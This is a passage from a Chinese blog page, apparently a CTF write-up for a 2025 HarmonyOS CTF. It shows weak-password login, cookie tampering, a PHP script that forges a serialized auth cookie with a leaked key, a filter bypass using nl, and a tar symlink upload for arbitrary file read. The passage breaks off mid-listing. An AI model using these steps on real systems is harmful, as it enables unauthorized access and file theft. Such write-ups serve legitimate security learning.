@@ -1,0 +1,2199 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="2025鸿蒙ctfwp Layers of Compromise 弱口令user/password123登入\ncookie改admin登入\nconfidential_note.txt\n1 2 内部API令牌: c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec confidential_dev.txt\n1 2 3 4 5 6 内部API端点: - status - config - debug (仅限本地访问) 查看 /data/app/www/secrettttts/ 获取开发令牌。 访问secrettttts/token.txt\n">
+<title>2025鸿蒙ctfwp</title>
+
+<link rel='canonical' href='https://0d000721999.github.io/p/2025%E9%B8%BF%E8%92%99ctfwp/'>
+
+<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="2025鸿蒙ctfwp">
+<meta property='og:description' content="2025鸿蒙ctfwp Layers of Compromise 弱口令user/password123登入\ncookie改admin登入\nconfidential_note.txt\n1 2 内部API令牌: c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec confidential_dev.txt\n1 2 3 4 5 6 内部API端点: - status - config - debug (仅限本地访问) 查看 /data/app/www/secrettttts/ 获取开发令牌。 访问secrettttts/token.txt\n">
+<meta property='og:url' content='https://0d000721999.github.io/p/2025%E9%B8%BF%E8%92%99ctfwp/'>
+<meta property='og:site_name' content='美咕噜的小站'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:published_time' content='2025-06-08T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-06-08T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/2025%E9%B8%BF%E8%92%99ctfwp/1.jpg' />
+<meta name="twitter:title" content="2025鸿蒙ctfwp">
+<meta name="twitter:description" content="2025鸿蒙ctfwp Layers of Compromise 弱口令user/password123登入\ncookie改admin登入\nconfidential_note.txt\n1 2 内部API令牌: c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec confidential_dev.txt\n1 2 3 4 5 6 内部API端点: - status - config - debug (仅限本地访问) 查看 /data/app/www/secrettttts/ 获取开发令牌。 访问secrettttts/token.txt\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://0d000721999.github.io/p/2025%E9%B8%BF%E8%92%99ctfwp/1.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu988272603220494224.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😋</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">美咕噜的小站</a></h1>
+            <h2 class="site-description">Ciallo～(∠・ω&lt; )⌒★</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://buuoj.cn/users/175721'
+                        target="_blank"
+                        title="BUUOJ"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
+  <line x1="7" y1="12" x2="13" y2="12" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/0d000721999'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/friends/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>Friends</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#layers-of-compromise">Layers of Compromise</a></li>
+    <li><a href="#filesystem">Filesystem</a></li>
+    <li><a href="#ezapp_and_server">ezAPP_And_SERVER</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/2025%E9%B8%BF%E8%92%99ctfwp/">
+                <img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/1.jpg"
+                        
+                        width="1152" 
+                        height="896" 
+                        loading="lazy"
+                        alt="Featured image of post 2025鸿蒙ctfwp" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/wp/" style="background-color: #2a9d8f; color: #fff;">
+                Wp
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/2025%E9%B8%BF%E8%92%99ctfwp/">2025鸿蒙ctfwp</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jun 08, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 6 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="2025鸿蒙ctfwp">2025鸿蒙ctfwp
+</h1><h2 id="layers-of-compromise">Layers of Compromise
+</h2><p>弱口令user/password123登入</p>
+<p>cookie改admin登入</p>
+<p>confidential_note.txt</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Plain" data-lang="Plain"><span class="line"><span class="cl">            内部API令牌:  
+</span></span><span class="line"><span class="cl">            c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec                             
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>confidential_dev.txt</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Plain" data-lang="Plain"><span class="line"><span class="cl">内部API端点:
+</span></span><span class="line"><span class="cl"> - status
+</span></span><span class="line"><span class="cl"> - config
+</span></span><span class="line"><span class="cl"> - debug (仅限本地访问)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> 查看 /data/app/www/secrettttts/ 获取开发令牌。                            
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>访问secrettttts/token.txt</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">7f8a1a4b3c7d9e6f2b5s8d7f9g6h5j4k3l2m1n
+</span></span><span class="line"><span class="cl">--auth.php
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_COOKIE</span><span class="o">[</span><span class="s1">&#39;auth_token&#39;</span><span class="o">]))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$auth_data</span> <span class="o">=</span> unserialize<span class="o">(</span>base64_decode<span class="o">(</span><span class="nv">$_COOKIE</span><span class="o">[</span><span class="s1">&#39;auth_token&#39;</span><span class="o">]))</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="nv">$auth_data</span><span class="o">[</span><span class="s1">&#39;username&#39;</span><span class="o">]</span> <span class="o">===</span> <span class="s1">&#39;dev&#39;</span> <span class="o">&amp;&amp;</span> 
+</span></span><span class="line"><span class="cl">        <span class="nv">$auth_data</span><span class="o">[</span><span class="s1">&#39;hash&#39;</span><span class="o">]</span> <span class="o">===</span> md5<span class="o">(</span><span class="s1">&#39;dev&#39;</span> . <span class="nv">$CONFIG</span><span class="o">[</span><span class="s1">&#39;auth_key&#39;</span><span class="o">]))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> true<span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">--
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;username&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;dev&#39;</span> <span class="s1">&#39;auth_key&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;S3cr3tK3y!2023&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>伪造token</p>
+<p>Exp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">// 配置信息
+</span></span><span class="line"><span class="cl"><span class="nv">$CONFIG</span> <span class="o">=</span> <span class="o">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;auth_key&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;S3cr3tK3y!2023&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">]</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// 创建认证数据数组
+</span></span><span class="line"><span class="cl"><span class="nv">$auth_data</span> <span class="o">=</span> <span class="o">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;username&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;dev&#39;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;hash&#39;</span> <span class="o">=</span>&gt; md5<span class="o">(</span><span class="s1">&#39;dev&#39;</span> . <span class="nv">$CONFIG</span><span class="o">[</span><span class="s1">&#39;auth_key&#39;</span><span class="o">])</span>
+</span></span><span class="line"><span class="cl"><span class="o">]</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// 序列化并编码
+</span></span><span class="line"><span class="cl"><span class="nv">$serialized</span> <span class="o">=</span> serialize<span class="o">(</span><span class="nv">$auth_data</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cookie_value</span> <span class="o">=</span> base64_encode<span class="o">(</span><span class="nv">$serialized</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// 输出结果
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;生成的 auth_token Cookie 值为:\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="nv">$cookie_value</span> . <span class="s2">&#34;\n\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl"><span class="nv">auth_token</span><span class="o">=</span><span class="nv">YToyOntzOjg6InVzZXJuYW1lIjtzOjM6ImRldiI7czo0OiJoYXNoIjtzOjMyOiI1ZGEwYjcxNTZkZDk1ZGQ3ZjdlYmNlNjA4YTBhNDY2YiI7fQ</span><span class="o">==</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608162810259.png"
+	width="1728"
+	height="681"
+	srcset="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608162810259_hu5077791609093123335.png 480w, /p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608162810259_hu1327355648061749003.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250608162810259"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="253"
+		data-flex-basis="608px"
+	
+></p>
+<p><img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608162826847.png"
+	width="1730"
+	height="681"
+	srcset="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608162826847_hu3735697577852103721.png 480w, /p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608162826847_hu5214039824131491128.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250608162826847"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="254"
+		data-flex-basis="609px"
+	
+></p>
+<p><img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608162840135.png"
+	width="1720"
+	height="729"
+	srcset="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608162840135_hu10673062212662906154.png 480w, /p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608162840135_hu2825161284300330601.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250608162840135"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="235"
+		data-flex-basis="566px"
+	
+></p>
+<p><img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608162851925.png"
+	width="1730"
+	height="684"
+	srcset="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608162851925_hu17306647814461083613.png 480w, /p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608162851925_hu9099332863798622544.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250608162851925"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="252"
+		data-flex-basis="607px"
+	
+></p>
+<p>cat，more,less都被过滤了，用nl</p>
+<p><img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608162902431.png"
+	width="1730"
+	height="711"
+	srcset="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608162902431_hu12948802113455206189.png 480w, /p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608162902431_hu2420601262866623997.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250608162902431"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="243"
+		data-flex-basis="583px"
+	
+></p>
+<h2 id="filesystem">Filesystem
+</h2><p>下载源码</p>
+<p>admin.controller.ts里面</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-typescript" data-lang="typescript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">configFile</span> <span class="o">=</span> <span class="s2">&#34;/opt/filesystem/adminconfig.lock&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这条未知，还有app.module.ts里面</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-typescript" data-lang="typescript"><span class="line"><span class="cl"><span class="kd">@Module</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">imports</span><span class="o">:</span> <span class="p">[</span><span class="nx">JwtModule</span><span class="p">.</span><span class="nx">register</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">secret</span><span class="o">:</span> <span class="s1">&#39;xxxxxxxxxxxxxx&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">signOptions</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">expiresIn</span><span class="o">:</span> <span class="s1">&#39;7d&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}),</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>secret未知，看到index界面可以文件上传和下载，想到任意文件下载，但是过滤了<code>./</code></p>
+<p>上传文件支持zip，tar想到上传软链接然后下载进行任意文件读取</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ln -s / malicious
+</span></span><span class="line"><span class="cl">zip --symlinks payload.zip malicious
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>zip好像不行，用tar</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ln -s / malicious
+</span></span><span class="line"><span class="cl">tar -cvf 1.tar malicious
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>指向根目录后，任意文件读取，参考前面web1的路径读取</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">download</span><span class="err">?</span><span class="n">filename</span><span class="o">=</span><span class="n">upload_1749308551054</span><span class="o">/</span><span class="n">malicious</span><span class="o">/</span><span class="n">data</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">app</span><span class="o">.</span><span class="n">module</span><span class="o">.</span><span class="n">ts</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250607230441821.png"
+	width="1884"
+	height="733"
+	srcset="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250607230441821_hu14373548614073428118.png 480w, /p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250607230441821_hu9359681252472196000.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250607230441821"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="257"
+		data-flex-basis="616px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-typescript" data-lang="typescript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span> <span class="nx">Module</span> <span class="p">}</span> <span class="kr">from</span> <span class="s1">&#39;@nestjs/common&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span> <span class="nx">AppController</span> <span class="p">}</span> <span class="kr">from</span> <span class="s1">&#39;./app.controller&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span> <span class="nx">AppService</span> <span class="p">}</span> <span class="kr">from</span> <span class="s1">&#39;./app.service&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span><span class="nx">AdminController</span><span class="p">}</span> <span class="kr">from</span> <span class="s2">&#34;./admin.controller&#34;</span><span class="p">;</span>
